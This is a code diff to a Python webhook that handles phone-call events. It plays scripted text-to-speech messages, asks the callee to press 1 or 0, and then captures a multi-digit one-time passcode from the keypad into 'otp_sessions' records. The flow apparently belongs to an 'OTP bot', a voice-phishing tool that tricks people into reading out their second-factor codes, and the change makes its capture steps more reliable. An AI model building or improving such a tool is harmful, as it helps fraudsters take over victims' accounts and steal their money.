@@ -412,11 +412,12 @@ async def handle_call_events(request: Request):
             logger.warning(f"No session for call {call_id}")
             return {"status": "no_session"}
         
-        session = active_sessions.get(session_id) or await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
+        # Always get fresh session from database
+        session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
         if not session:
             return {"status": "session_not_found"}
         
-        # Update active session
+        # Update active session cache
         active_sessions[session_id] = session
         
         # Handle events
@@ -434,14 +435,8 @@ async def handle_call_events(request: Request):
             active_sessions[session_id]["current_step"] = 1
             active_sessions[session_id]["status"] = "step1"
             
-            # Play Step 1 greeting
-            await emit_log(session_id, "step", "🎙️ Playing Step 1 message...")
-            step1_text = session["messages"]["step1"]
-            await play_tts(call_id, step1_text, session.get("language", "en"))
-            
-            # Start capturing 1 digit for choice
-            await asyncio.sleep(8)  # Wait for TTS to finish
-            await start_dtmf_capture(call_id, max_length=1, timeout=30)
+            # Play Step 1 greeting and start DTMF capture in background
+            asyncio.create_task(play_step1_and_capture(session_id, session, call_id))
             
         elif event_type == "CALL_FINISHED":
             reason = body.get("errorCode", {}).get("name", "completed")
@@ -465,15 +460,22 @@ async def handle_call_events(request: Request):
             )
             
         elif event_type == "SAY_FINISHED":
+            # TTS finished - check if we need to start DTMF capture
             logger.info(f"TTS finished on {call_id}")
+            await handle_say_finished(session_id, session, call_id)
             
         elif event_type == "DTMF_CAPTURED":
+            # Handle both expected and unexpected DTMF
             dtmf_value = body.get("dtmf", "")
-            await handle_dtmf(session_id, session, call_id, dtmf_value)
+            capture_requested = body.get("captureRequested", True)
+            logger.info(f"DTMF_CAPTURED: {dtmf_value}, captureRequested: {capture_requested}")
+            if dtmf_value:
+                await handle_dtmf(session_id, session, call_id, dtmf_value)
             
         elif event_type == "CAPTURE_FINISHED":
             # DTMF capture timeout or finished
             dtmf_value = body.get("dtmf", "")
+            logger.info(f"CAPTURE_FINISHED: dtmf={dtmf_value}")
             if dtmf_value:
                 await handle_dtmf(session_id, session, call_id, dtmf_value)
         
@@ -482,6 +484,43 @@ async def handle_call_events(request: Request):
     except Exception as e:
         logger.error(f"Webhook error: {e}", exc_info=True)
         return {"status": "error", "message": str(e)}
+
+async def play_step1_and_capture(session_id: str, session: dict, call_id: str):
+    """Play Step 1 greeting and start DTMF capture"""
+    try:
+        await emit_log(session_id, "step", "🎙️ Playing Step 1 message...")
+        step1_text = session["messages"]["step1"]
+        await play_tts(call_id, step1_text, session.get("language", "en"))
+        # Note: DTMF capture will be started after SAY_FINISHED event
+    except Exception as e:
+        logger.error(f"Error in play_step1_and_capture: {e}")
+
+async def handle_say_finished(session_id: str, session: dict, call_id: str):
+    """Handle SAY_FINISHED event - start appropriate DTMF capture"""
+    try:
+        # Refresh session from DB to get current step
+        session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
+        if not session:
+            return
+            
+        current_step = session.get("current_step", 1)
+        status = session.get("status", "")
+        otp_digits = session.get("otp_digits", 6)
+        
+        logger.info(f"SAY_FINISHED: current_step={current_step}, status={status}")
+        
+        if current_step == 1 and status == "step1":
+            # After Step 1 message, capture 1 digit choice
+            await emit_log(session_id, "info", "⏳ Waiting for user input (1 or 0)...")
+            await start_dtmf_capture(call_id, max_length=1, timeout=30)
+            
+        elif current_step == 2 and status == "step2":
+            # After Step 2 message, capture OTP digits
+            await emit_log(session_id, "info", f"⏳ Waiting for {otp_digits}-digit OTP...")
+            await start_dtmf_capture(call_id, max_length=otp_digits, timeout=60)
+            
+    except Exception as e:
+        logger.error(f"Error in handle_say_finished: {e}")
 
 async def handle_dtmf(session_id: str, session: dict, call_id: str, dtmf_value: str):
     """Handle DTMF input based on current step"""
